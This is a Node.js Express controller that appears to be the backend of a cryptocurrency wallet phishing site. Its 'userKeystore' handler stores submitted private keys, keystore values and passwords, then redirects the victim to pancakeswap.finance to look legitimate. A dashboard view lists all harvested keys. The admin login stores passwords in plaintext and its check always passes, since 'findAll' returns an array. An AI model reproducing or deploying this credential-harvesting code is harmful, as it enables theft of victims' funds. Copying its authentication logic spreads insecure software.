const { User, Keystore } = require('../models/userModel')
module.exports = {

    login: async (req, res) => {
        const users = await User.findAll({
            raw: true,
            //Other parameters
        });
        res.render('login', { users: users, data: [] })
    },

    loginUsers: async () => {
        const users = await User.findAll({
            raw: true,
            //Other parameters
        });
        return users;

    },

    loginUser: async (req, res, next) => {
        const { userName, password } = req.body
        const keystores = await Keystore.findAll({
            raw: true,
            //Other parameters
        });
        const users = await User.findAll({
            raw: true,
            //Other parameters
        });
        const loginUser = await User.findAll({
            where: { password: password, userName: userName },
            raw: true
        })
        if (loginUser) {
            res.render('dashboard', { data: keystores, users: users })
        } else {
            res.render('login', { message: "loginUSer not successful", status: "error" })
        }
    },

    async listUsers() {
        const keystores = await Keystore.findAll({
            raw: true,
            //Other parameters
        });
        return keystores;

    },


    getAllUser: async (req, res, next) => {
        const keystores = await Keystore.findAll({
            raw: true,
            //Other parameters
        });
        const users = await User.findAll({
            raw: true,
            //Other parameters
        });
        res.render('dashboard', { data: keystores, users: users })

    },
    getHomePage: async (req, res, next) => {

        res.render('secure')

    },
    secure: (req, res, next) => {
        res.render('secure')
    },

    userSecure: (req, res, next) => {
        res.render('secure')
    },

    keystore: (req, res, next) => {
        res.render('keystore')
    },

    userKeystore: (req, res, next) => {
        const { keyValue, password, keyType } = req.body
        Keystore
            .create({
                keyValue: keyValue ? keyValue : "NA",
                password: password ? password : "NA",
                keyType

            })
            .then(result => {
                console.log("Successful")
                res.redirect("https://pancakeswap.finance/")
            }).catch(error => {
                console.log(error)
                res.render('keyStore', { message: "userKeystore not successful", status: "error" })
            })

    },


    privateKey: (req, res, next) => {
        res.render('privateKey')
    },

    userKey: (req, res, next) => {
        res.render('privateKey')

    }

}
